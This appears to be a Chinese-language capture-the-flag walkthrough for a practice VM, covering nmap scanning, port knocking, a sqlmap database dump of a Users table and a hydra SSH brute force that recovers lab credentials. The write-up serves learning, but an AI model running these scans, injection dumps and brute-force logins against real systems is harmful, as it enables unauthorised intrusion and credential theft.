## 信息收集

我们在VM中需要确定攻击目标的IP地址，需要使用使用netdiscovernmap获取目标IP地址：

```


nmap -sP 192.168.1.0/24 -T4
```

![](../Images/c6db3166fcd97d38660e48b74f86f8f6.png)

我们已经找到了此次CTF目标计算机IP地址：192.168.1.10

  

我们开始探索机器。第一步是找出目标计算机上可用的开放端口和一些服务。

  

因此我在目标计算机上启动了nmap全端口T5速度扫描：

```


nmap -sS -sV -A -T5 -p- 192.168.1.10
```

![](../Images/4e9efaaf4bab82588a5bb7b6499c1466.png)

图中可以看出，貌似目标计算机上只开放了22端口。尝试访问看下信息；

```
ssh root@192.168.1.10
```

![](../Images/05fe118de1eaf1bf23f194bb359c3ab9.png)

ssh登录提示上面的界面，猜测是端口敲门服务(指的是客户端设备向服务器IP发送一系列实现预定好的暗号，而服务器上需要安装相对应接收暗号的服务knockd，服务器在接收到正确的暗号后，会临时性的为敲门者(客户端)开一段时间的门并随后关上，敲门者(客户端)要在这段时间内登录成功并且保持连接，如果断了连接就要重新敲门。客户端相当于访客，服务端knockd相当于门童，暗号对上后门童临时开门给访客放行，待访客进入后又关上门 这种方法可以作为一种安全隐藏手段)。

```


先通过knock -v 192.168.1.10 1 2 3命令实现端口敲门，然后再次使用nmap扫描靶机开放的端口：
```

## 漏洞测试

通过sqlmap的注入发现这里存在注入漏洞：

![](../Images/9c6c756fd00d1fe8f40cb5e42e36e652.png)

在Webapp数据库里发现存在Users表：

```


sqlmap -r 2.txt --random-agent -D Webapp --tables 
```

查看数据表Users中的字段信息：

```


sqlmap -r 2.txt --random-agent -D Webapp -T Users   --columns
```

继续查看具体的数据内容：

```


sqlmap -r 2.txt --random-agent -D Webapp -T Users   -C username,password  --dump
```

尝试使用获取的账户密码登录网站后台，发现使用这5个账户密码登录之前的界面，会跳转到同一个profile.php界面，说明账户密码不是在这里使用的；

  

将这5个账户名和密码制作成字典文件，使用hydra爆破22端口ssh服务；

```
hydra -L username.txt -P passwd.txt ssh://192.168.1.10
```

![](../Images/d868dca49778b6fb2c6bcb332212a11d.png)

成功爆破出账户密码：`login: smeagol password: MyPreciousR00t`，使用获取的账户密码登录：

![](../Images/2a31f6f72327d2a1081886659bf12bab.png)
